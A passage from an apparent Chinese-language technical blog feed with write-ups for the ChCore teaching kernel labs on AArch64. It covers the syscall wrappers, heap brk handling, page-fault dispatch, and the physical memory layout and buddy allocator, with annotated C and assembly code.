adr	x27, syscall_table		<span class="comment">// syscall table in x27</span></span><br><span class="line">    uxtw	x16, w8				<span class="comment">// syscall number in x16</span></span><br><span class="line">    ldr	x16, [x27, x16, lsl #<span class="number">3</span>]		<span class="comment">// find the syscall entry</span></span><br><span class="line">    blr	x16</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Ret from syscall */</span></span><br><span class="line">    <span class="comment">// bl	disable_irq</span></span><br><span class="line">    str	x0, [sp] <span class="comment">/* set the return value of the syscall */</span></span><br><span class="line">    exception_exit</span><br></pre></td></tr></table></figure>
系统调用表在 <code>syscall.c</code> 文件中<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">u64 <span class="title function_">syscall</span><span class="params">(u64 sys_no, u64 arg0, u64 arg1, u64 arg2, u64 arg3, u64 arg4,</span></span><br><span class="line"><span class="params">	    u64 arg5, u64 arg6, u64 arg7, u64 arg8)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	u64 ret = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Lab3: Your code here</span></span><br><span class="line"><span class="comment">	 * Use inline assembly to store arguments into x0 to x7, store syscall number to x8,</span></span><br><span class="line"><span class="comment">	 * And finally use svc to execute the system call. After syscall returned, don&#x27;t forget</span></span><br><span class="line"><span class="comment">	 * to move return value from x0 to the ret variable of this function</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;mov x8, %1\n&quot;</span></span></span><br><span class="line"><span class="params">			<span class="string">&quot;mov x0, %2\n&quot;</span></span></span><br><span class="line"><span class="params">			<span class="string">&quot;mov x1, %3\n&quot;</span></span></span><br><span class="line"><span class="params">			<span class="string">&quot;mov x2, %4\n&quot;</span></span></span><br><span class="line"><span class="params">			<span class="string">&quot;mov x3, %5\n&quot;</span></span></span><br><span class="line"><span class="params">			<span class="string">&quot;mov x4, %6\n&quot;</span></span></span><br><span class="line"><span class="params">			<span class="string">&quot;mov x5, %7\n&quot;</span></span></span><br><span class="line"><span class="params">			<span class="string">&quot;mov x6, %8\n&quot;</span></span></span><br><span class="line"><span class="params">			<span class="string">&quot;mov x7, %9\n&quot;</span></span></span><br><span class="line"><span class="params">			<span class="string">&quot;svc #0\n&quot;</span></span></span><br><span class="line"><span class="params">			<span class="string">&quot;mov %0, x0\n&quot;</span></span></span><br><span class="line"><span class="params">			:<span class="string">&quot;=r&quot;</span> (ret)</span></span><br><span class="line"><span class="params">			:<span class="string">&quot;r&quot;</span>(sys_no), <span class="string">&quot;r&quot;</span>(arg0), <span class="string">&quot;r&quot;</span>(arg1), <span class="string">&quot;r&quot;</span>(arg2), <span class="string">&quot;r&quot;</span>(arg3), <span class="string">&quot;r&quot;</span>(arg4), <span class="string">&quot;r&quot;</span>(arg5), <span class="string">&quot;r&quot;</span>(arg6), <span class="string">&quot;r&quot;</span>(arg7), <span class="string">&quot;r&quot;</span>(arg8)</span></span><br><span class="line"><span class="params">			:<span class="string">&quot;x0&quot;</span>, <span class="string">&quot;x1&quot;</span>, <span class="string">&quot;x2&quot;</span>, <span class="string">&quot;x3&quot;</span>, <span class="string">&quot;x4&quot;</span>, <span class="string">&quot;x5&quot;</span>, <span class="string">&quot;x6&quot;</span>, <span class="string">&quot;x7&quot;</span>, <span class="string">&quot;x8&quot;</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Lab3: your code here:</span></span><br><span class="line"><span class="comment"> * Finish the following system calls using helper function syscall</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">usys_putc</span><span class="params">(<span class="type">char</span> ch)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> syscall(SYS_putc, ch, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">usys_exit</span><span class="params">(<span class="type">int</span> ret)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> syscall(SYS_exit, ret, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">usys_create_pmo</span><span class="params">(u64 size, u64 type)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> syscall(SYS_create_pmo, size, type, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">usys_map_pmo</span><span class="params">(u64 process_cap, u64 pmo_cap, u64 addr, u64 rights)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> syscall(SYS_map_pmo, process_cap, pmo_cap, addr, rights, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u64 <span class="title function_">usys_handle_brk</span><span class="params">(u64 addr)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(SYS_handle_brk, addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="sys-handle-brk-实现"><a href="#sys-handle-brk-实现" class="headerlink" title="sys_handle_brk 实现"></a>sys_handle_brk 实现</h3>每个进程均有一个虚拟地址空间结构 <code>vmspace</code>，记录地址区域，页表、堆</li>
<li>user_current_heap 堆起始地址</li>
<li>heap_vmr-&gt;size 堆长度</li>
<li>heap_vmr-&gt;pmo 堆关联的物理内存对象 PMO<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vmregion</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">node</span>;</span>	<span class="comment">// vmr_list</span></span><br><span class="line">    <span class="type">vaddr_t</span> start;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">vmr_prop_t</span> perm;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pmobject</span> *<span class="title">pmo</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vmspace</span> &#123;</span></span><br><span class="line">    <span class="comment">/* list of vmregion */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">vmr_list</span>;</span></span><br><span class="line">    <span class="comment">/* root page table */</span></span><br><span class="line">    <span class="type">vaddr_t</span> *pgtbl;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vmregion</span> *<span class="title">heap_vmr</span>;</span></span><br><span class="line">    <span class="type">vaddr_t</span> user_current_heap;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">u64 <span class="title function_">sys_handle_brk</span><span class="params">(u64 addr)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vmspace</span> *<span class="title">vmspace</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pmobject</span> *<span class="title">pmo</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vmregion</span> *<span class="title">vmr</span>;</span></span><br><span class="line">	<span class="type">size_t</span> len;</span><br><span class="line">	u64 retval;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	vmspace = obj_get(current_process, VMSPACE_OBJ_ID, TYPE_VMSPACE);</span><br><span class="line"></span><br><span class="line">	retval = vmspace-&gt;user_current_heap;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Lab3: Your code here</span></span><br><span class="line"><span class="comment">	 * The sys_handle_brk syscall modifies the top address of heap to addr.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * If addr is 0, this function should initialize the heap, implemeted by:</span></span><br><span class="line"><span class="comment">	 * 1. Create a new pmo with size 0 and type PMO_ANONYM.</span></span><br><span class="line"><span class="comment">	 * 2. Initialize vmspace-&gt;heap_vmr using function init_heap_vmr(), which generates </span></span><br><span class="line"><span class="comment">	 * the mapping between  user heap&#x27;s virtual address (already stored in </span></span><br><span class="line"><span class="comment">	 * vmspace-&gt;user_current_heap) and the pmo you just created.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * HINT: For more details about how to create and initiailze a pmo, check function </span></span><br><span class="line"><span class="comment">	 * &#x27;load_binary&#x27; for reference.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * If addr is larger than heap, the size of vmspace-&gt;heap_vmr and the size of its </span></span><br><span class="line"><span class="comment">	 * coresponding pmo should be updated. Real physical memory allocation are done in </span></span><br><span class="line"><span class="comment">	 * a lazy manner using pagefault handler later at the first access time. </span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * If addr is smaller than heap, do nothing and return -EINVAL since we are not going</span></span><br><span class="line"><span class="comment">	 * to support shink heap. For all other cases, return the virtual address of the heap </span></span><br><span class="line"><span class="comment">	 * top.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (addr == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		pmo = obj_alloc(TYPE_PMO, <span class="keyword">sizeof</span>(*pmo));</span><br><span class="line">		<span class="keyword">if</span> (!pmo)&#123;</span><br><span class="line">			retval = -ENOMEM;</span><br><span class="line">			<span class="keyword">goto</span> error_return;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		vmr = init_heap_vmr(vmspace, vmspace-&gt;user_current_heap, pmo);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (vmr == <span class="literal">NULL</span>)&#123;</span><br><span class="line">			retval = -ENOMAPPING;</span><br><span class="line">			<span class="keyword">goto</span> free_obj;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		vmspace-&gt;heap_vmr = vmr;</span><br><span class="line">		retval = vmspace-&gt;user_current_heap;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (addr &gt; vmspace-&gt;user_current_heap + vmspace-&gt;heap_vmr-&gt;size) &#123;</span><br><span class="line">		<span class="type">size_t</span> sz = ROUND_UP(addr - vmspace-&gt;user_current_heap, PAGE_SIZE);</span><br><span class="line">		vmspace-&gt;heap_vmr-&gt;size = sz;</span><br><span class="line">		vmspace-&gt;heap_vmr-&gt;pmo-&gt;size = sz;</span><br><span class="line">		retval = addr;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (addr &lt; vmspace-&gt;user_current_heap + vmspace-&gt;heap_vmr-&gt;size)&#123;</span><br><span class="line">		retval = -EINVAL;</span><br><span class="line">		<span class="keyword">goto</span> error_return;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * return origin heap addr on failure;</span></span><br><span class="line"><span class="comment">	 * return new heap addr on success.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	obj_put(vmspace);</span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line">free_obj:</span><br><span class="line">	obj_free(pmo);</span><br><span class="line">error_return:</span><br><span class="line">	obj_put(vmspace);</span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="用户程序执行流程"><a href="#用户程序执行流程" class="headerlink" title="用户程序执行流程"></a>用户程序执行流程</h3>用户程序的 <code>ELF</code> 文件入口由 <code>load_binary</code> 和 <code>init_thread_ctx</code> 加载到线程初始的程序计数器中<br>程序的入口点事 <code>user/lib/libmain.S</code> 的 <code>START</code> 函数，该函数负责调用 <code>_start_c</code> 函数，最终调用用户程序 <code>main</code><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BEGIN_FUNC(START)</span><br><span class="line">	mov x29, #<span class="number">0</span></span><br><span class="line">	mov x30, #<span class="number">0</span></span><br><span class="line">	mov x0, sp</span><br><span class="line">	and sp, x0, #<span class="number">-16</span></span><br><span class="line">	b _start_c</span><br><span class="line"><span class="title function_">END_FUNC</span><span class="params">(START)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _<span class="title function_">start_c</span><span class="params">(<span class="type">long</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> argc = p[<span class="number">0</span>];</span><br><span class="line">    <span class="type">char</span> **argv = (<span class="type">void</span> *)(p + <span class="number">1</span>);</span><br><span class="line">    <span class="type">char</span> **envp = (<span class="type">void</span> *)(p + <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ret = main(argc, argv, envp);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * Lab3: Your code here</span></span><br><span class="line"><span class="comment">    * Complete the main function</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    usys_exit(ret);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="处理缺页异常"><a href="#处理缺页异常" class="headerlink" title="处理缺页异常"></a>处理缺页异常</h3><p>首先在 <code>handle_entry_c</code> 中将缺页异常进行函数跳转</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">handle_entry_c</span><span class="params">(<span class="type">int</span> type, u64 esr, u64 address)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* ec: exception class */</span></span><br><span class="line">	u32 esr_ec = GET_ESR_EL1_EC(esr);</span><br><span class="line"></span><br><span class="line">	kdebug</span><br><span class="line">	    (<span class="string">&quot;Interrupt type: %d, ESR: 0x%lx, Fault address: 0x%lx, EC 0b%b\n&quot;</span>,</span><br><span class="line">	     type, esr, address, esr_ec);</span><br><span class="line">	<span class="comment">/* Dispatch exception according to EC */</span></span><br><span class="line">	<span class="keyword">switch</span> (esr_ec) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Lab3: Your code here</span></span><br><span class="line"><span class="comment">		 * Handle exceptions as required in the lab document. Checking exception codes in</span></span><br><span class="line"><span class="comment">		 * esr.h may help.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">case</span> ESR_EL1_EC_UNKNOWN:</span><br><span class="line">			kinfo(<span class="string">&quot;%s&quot;</span>, UNKNOWN);</span><br><span class="line">			sys_exit(-ESUPPORT);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> ESR_EL1_EC_DABT_CEL:</span><br><span class="line">		<span class="keyword">case</span> ESR_EL1_EC_DABT_LEL:</span><br><span class="line">			do_page_fault(esr, address);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		kdebug(<span class="string">&quot;Unsupported Exception ESR %lx\n&quot;</span>, esr);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>do_page_fault</code> 预处理后传给 <code>handle_trans_fault</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">do_page_fault</span><span class="params">(u64 esr, u64 fault_ins_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">vaddr_t</span> fault_addr;</span><br><span class="line">    <span class="type">int</span> fsc;		<span class="comment">// fault status code</span></span><br><span class="line"></span><br><span class="line">    fault_addr = get_fault_addr(); <span class="comment">// 获取错误地址</span></span><br><span class="line">    fsc = GET_ESR_EL1_FSC(esr);</span><br><span class="line">    <span class="keyword">switch</span> (fsc) &#123;</span><br><span class="line">    <span class="keyword">case</span> DFSC_TRANS_FAULT_L0:</span><br><span class="line">    <span class="keyword">case</span> DFSC_TRANS_FAULT_L1:</span><br><span class="line">    <span class="keyword">case</span> DFSC_TRANS_FAULT_L2:</span><br><span class="line">    <span class="keyword">case</span> DFSC_TRANS_FAULT_L3:&#123;</span><br><span class="line">        <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">        ret = handle_trans_fault(current_thread-&gt;vmspace,</span><br><span class="line">                        fault_addr);</span><br><span class="line">        <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">            kinfo(<span class="string">&quot;pgfault at 0x%p failed\n&quot;</span>, fault_addr);</span><br><span class="line">            sys_exit(ret);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        kinfo(<span class="string">&quot;do_page_fault: fsc is unsupported (0x%b) now\n&quot;</span>, fsc);</span><br><span class="line">        BUG_ON(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>handle_trans_fault 主要执行以下几种工作：</p>
<ul>
<li>检查 PMO 的合法性</li>
<li>分配物理内存页</li>
<li>映射到缺页位置</li>
</ul>
]]></content>
      <categories>
        <category>Kernel</category>
        <category>ARM</category>
      </categories>
      <tags>
        <tag>AArch64</tag>
      </tags>
  </entry>
  <entry>
    <title>ChCore Lab2 内存管理</title>
    <url>/2022/05/30/ChCore-Lab2-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="物理内存管理"><a href="#物理内存管理" class="headerlink" title="物理内存管理"></a>物理内存管理</h1><h2 id="物理内存布局"><a href="#物理内存布局" class="headerlink" title="物理内存布局"></a>物理内存布局</h2><h3 id="问题-1"><a href="#问题-1" class="headerlink" title="问题 1"></a>问题 1</h3><p><strong>请简单解释，在哪个文件或代码段中指定了 ChCore 物理内存布局。你可以从两个方面回答这个问题: 编译阶段和运行时阶段。</strong></p>
<p>在编译阶段，主要使用的是连接器脚本进行确认：</p>
<ul>
<li><code>bootloader</code> 对应 <code>kernel.img</code> 的 <code>init</code> 段，<code>img_start</code> 即 <code>init</code> 被硬编码为 <code>0x80000</code>，其范围即为整个 <code>init</code> 段的范围</li>
<li>内核 对应 <code>kernel.img</code> 的 <code>.text</code> <code>.rodata</code> 等程序段，末尾即 <code>img_end</code></li>
<li><code>Reserved</code> 属于是不使用区域，访问引发异常</li>
</ul>
<p>在运行时阶段，分配过程即 <code>Memory Layout</code> 由 <code>mm.c</code> 决定</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PHYSICAL_MEM_START (24*1024*1024)	<span class="comment">//24M</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> START_VADDR phys_to_virt(PHYSICAL_MEM_START)	<span class="comment">//24M</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NPAGES (128*1000)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PHYSICAL_MEM_END (PHYSICAL_MEM_START+NPAGES*BUDDY_PAGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="type">vaddr_t</span> free_mem_start = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page_meta_start</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">u64 npages = <span class="number">0</span>;</span><br><span class="line">u64 start_vaddr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内存对其</span></span><br><span class="line">free_mem_start =</span><br><span class="line">    phys_to_virt(ROUND_UP((<span class="type">vaddr_t</span>) (&amp;img_end), PAGE_SIZE));</span><br><span class="line">npages = NPAGES;</span><br><span class="line">start_vaddr = START_VADDR;</span><br><span class="line">kdebug(<span class="string">&quot;[CHCORE] mm: free_mem_start is 0x%lx, free_mem_end is 0x%lx\n&quot;</span>,</span><br><span class="line">        free_mem_start, phys_to_virt(PHYSICAL_MEM_END));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 预留 npages 页内存作为 page metadata 的空间</span></span><br><span class="line"><span class="keyword">if</span> ((free_mem_start + npages * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> page)) &gt; start_vaddr) &#123;</span><br><span class="line">    BUG(<span class="string">&quot;kernel panic: init_mm metadata is too large!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">page_meta_start = (<span class="keyword">struct</span> page *)free_mem_start;</span><br><span class="line">kdebug(<span class="string">&quot;page_meta_start: 0x%lx, real_start_vadd: 0x%lx,&quot;</span></span><br><span class="line">        <span class="string">&quot;npages: 0x%lx, meta_page_size: 0x%lx\n&quot;</span>,</span><br><span class="line">        page_meta_start, start_vaddr, npages, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> page));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化物理内存的伙伴分配器</span></span><br><span class="line"><span class="comment">/* buddy alloctor for managing physical memory */</span></span><br><span class="line">init_buddy(&amp;global_mem, page_meta_start, start_vaddr, npages);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化分配小内存区域的 slab分配器</span></span><br><span class="line"><span class="comment">/* slab alloctor for allocating small memory regions */</span></span><br><span class="line">init_slab();</span><br><span class="line"></span><br><span class="line">map_kernel_space(KBASE + (<span class="number">128UL</span> &lt;&lt; <span class="number">21</span>), <span class="number">128UL</span> &lt;&lt; <span class="number">21</span>, <span class="number">128UL</span> &lt;&lt; <span class="number">21</span>);</span><br><span class="line"><span class="comment">//check whether kernel space [KABSE + 256 : KBASE + 512] is mapped </span></span><br><span class="line">kernel_space_check();</span><br></pre></td></tr></table></figure>
<ul>
<li><code>page metadata</code> 是物理页的元数据，即 <code>struct page</code>，用来记录页面的属性，如是否被分配、内存块阶数是否被 <code>slab</code> 分配器使用</li>
<li><code>page</code> 即实际存在的物理页面</li>
</ul>
<h2 id="伙伴系统"><a href="#伙伴系统" class="headerlink" title="伙伴系统"></a>伙伴系统</h2><h3 id="方案思想"><a href="#方案思想" class="headerlink" title="方案思想"></a>方案思想</h3><p>伙伴系统的思想是将内存进行分块，建立空闲块的链表 <code>free_lists</code>，每组链表中使用 <code>list_head</code> 链接同阶内存快</p>
<p>注：只有唯一的伙伴块可以合并</p>
<h3 id="结构实现"><a href="#结构实现" class="headerlink" title="结构实现"></a>结构实现</h3><p>在 <code>ChCore</code> 中使用唯一 <code>struct global_mem</code> 进行描述物理内存数据结构，</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">struct phys_mem_pool &#123;</span><br><span class="line">    u64 pool_start_addr; // 物理内存起始地址</span><br><span class="line">    u64 pool_mem_size; // 物理内存大小</span><br><span class="line">    u64 pool_phys_page_num; // 物理页数目</span><br><span class="line">    struct page *page_metadata; // 物理页元数据起始地址</span><br><span class="line">    struct free_list free_lists[BUDDY_MAX_ORDER]; // 内存块空闲链表</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>为了方便计数，free_list 维护了空闲块的个数 nr_free 和其管理的 free_list</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">struct free_list &#123;</span><br><span class="line">	struct list_head free_list; // 空闲链表</span><br><span class="line">	u64 nr_free;    // 空闲块数目</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct list_head &#123;</span><br><span class="line">	struct list_head *prev;</span><br><span class="line">	struct list_head *next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>如何通过 <code>list_head</code> 对页进行管理呢，其实并非直接将 page 进行链接，而是通过 page 结构体内部的成员 node 进行链接</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">struct page &#123;</span><br><span class="line">	struct list_head node; // 空闲链表</span><br><span class="line">	int allocated; // 是否已分配</span><br><span class="line">	int order; // 当前页属于几阶内存块</span><br><span class="line">	void *slab; // 被 slab 分配器使用</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">                  page    page    page</span><br><span class="line"> free_list       ┌────┐  ┌────┐  ┌────┐</span><br><span class="line">┌─────────┐      │    │  │    │  │    │</span><br><span class="line">│nr_free  │      │    │  │    │  │    │</span><br><span class="line">├─────────┤    ─►├────┼─►├────┼─►├────┼─►</span><br><span class="line">│free_list├───►  │node│  │node│  │node│</span><br><span class="line">└─────────┘    ◄─┴────┘◄─┴────┘◄─┴────┘◄─</span><br></pre></td></tr></table></figure>
<p>如何根据 <code>node</code> 获取 <code>page</code> 的地址呢，最简单的想法就是根据偏移值</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define list_entry(ptr, <span class="built_in">type</span>, field) \</span></span><br><span class="line"><span class="language-bash">	container_of(ptr, <span class="built_in">type</span>, field)</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define container_of(ptr, <span class="built_in">type</span>, field) \</span></span><br><span class="line"><span class="language-bash">	((<span class="built_in">type</span> *)((void *)(ptr) - (u64)(&amp;(((<span class="built_in">type</span> *)(0))-&gt;field))))</span></span><br><span class="line"></span><br><span class="line">简化一下</span><br><span class="line">ptr：指向地址</span><br><span class="line">type：所属结构体类型</span><br><span class="line">field：结构体中所属字段</span><br><span class="line"></span><br><span class="line">🌰 struct page *page = list_entry((struct list_head *) ptr, (strcut page) page, ((struct page) page-&gt;(struct list_head)) node)</span><br></pre></td></tr></table></figure>

<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">init_buddy</span><span class="params">(<span class="keyword">struct</span> phys_mem_pool *pool, <span class="keyword">struct</span> page *start_page,</span></span><br><span class="line"><span class="params">		<span class="type">vaddr_t</span> start_addr, u64 page_num)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> order;</span><br><span class="line">    <span class="type">int</span> page_idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化内存池</span></span><br><span class="line">    pool-&gt;pool_start_addr = start_addr;</span><br><span class="line">    pool-&gt;page_metadata = start_page;</span><br><span class="line">    pool-&gt;pool_mem_size = page_num * BUDDY_PAGE_SIZE;</span><br><span class="line">    <span class="comment">/* This field is for unit test only. */</span></span><br><span class="line">    pool-&gt;pool_phys_page_num = page_num;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化各阶 free_list</span></span><br><span class="line">    <span class="keyword">for</span> (order = <span class="number">0</span>; order &lt; BUDDY_MAX_ORDER; ++order) &#123;</span><br><span class="line">        pool-&gt;free_lists[order].nr_free = <span class="number">0</span>;</span><br><span class="line">        init_list_head(&amp;(pool-&gt;free_lists[order].free_list));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清空元数据区</span></span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">char</span> *)start_page, <span class="number">0</span>, page_num * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> page));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化元数据区，将每个页均标记为已分配，阶数为 0</span></span><br><span class="line">    <span class="keyword">for</span> (page_idx = <span class="number">0</span>; page_idx &lt; page_num; ++page_idx) &#123;</span><br><span class="line">        page = start_page + page_idx;</span><br><span class="line">        page-&gt;allocated = <span class="number">1</span>;</span><br><span class="line">        page-&gt;order = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 对每个 page 进行回收，通过 buddy_free_pages 收到对应的 free_list 中</span></span><br><span class="line">    <span class="keyword">for</span> (page_idx = <span class="number">0</span>; page_idx &lt; page_num; ++page_idx) &#123;</span><br><span class="line">        page = start_page + page_idx;</span><br><span class="line">        buddy_free_pages(pool, page);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取伙伴块</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> page *<span class="title function_">get_buddy_chunk</span><span class="params">(<span class="keyword">struct</span> phys_mem_pool *pool,</span></span><br><span class="line"><span class="params">				    <span class="keyword">struct</span> page *chunk)</span></span><br><span class="line">&#123;</span><br><span class="line">    u64 chunk_addr;</span><br><span class="line">    u64 buddy_chunk_addr;</span><br><span class="line">    <span class="type">int</span> order;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前块的地址</span></span><br><span class="line">    chunk_addr = (u64) page_to_virt(pool, 